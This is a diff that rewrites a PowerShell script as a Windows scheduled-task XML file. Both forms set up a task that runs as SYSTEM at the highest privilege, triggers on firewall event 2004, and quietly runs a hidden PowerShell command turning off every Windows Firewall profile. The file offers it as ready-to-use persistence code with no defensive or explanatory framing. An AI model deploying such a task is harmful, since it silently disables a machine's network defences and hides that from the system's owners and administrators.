@@ -1,13 +1,37 @@
-$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -NonInteractive -WindowStyle Hidden -Command `"Set-NetFirewallProfile Domain,Public,Private -Enabled False`""
-
-$trigger = New-ScheduledTaskTrigger -OnEvent -Subscription @"
+<?xml version="1.0" encoding="UTF-16"?>
+<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+  <Triggers>
+    <EventTrigger>
+      <Enabled>true</Enabled>
+      <Subscription>
+        <![CDATA[
 <QueryList>
   <Query Id="0" Path="Microsoft-Windows-Windows Firewall With Advanced Security/Firewall">
     <Select Path="Microsoft-Windows-Windows Firewall With Advanced Security/Firewall">
-    *[System[(EventID=2004)]]
+      *[System[(EventID=2004)]]
     </Select>
   </Query>
 </QueryList>
-"@
-
-Register-ScheduledTask -TaskName "FirewallOpenedTrigger2" -Action $action -Trigger $trigger -User "SYSTEM" -RunLevel Highest
+        ]]>
+      </Subscription>
+    </EventTrigger>
+  </Triggers>
+  <Principals>
+    <Principal id="Author">
+      <UserId>SYSTEM</UserId>
+      <LogonType>ServiceAccount</LogonType>
+      <RunLevel>HighestAvailable</RunLevel>
+    </Principal>
+  </Principals>
+  <Settings>
+    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+    <StartWhenAvailable>true</StartWhenAvailable>
+    <Enabled>true</Enabled>
+  </Settings>
+  <Actions Context="Author">
+    <Exec>
+      <Command>powershell.exe</Command>
+      <Arguments>-NoProfile -NonInteractive -WindowStyle Hidden -Command "Set-NetFirewallProfile Domain,Public,Private -Enabled False"</Arguments>
+    </Exec>
+  </Actions>
+</Task>
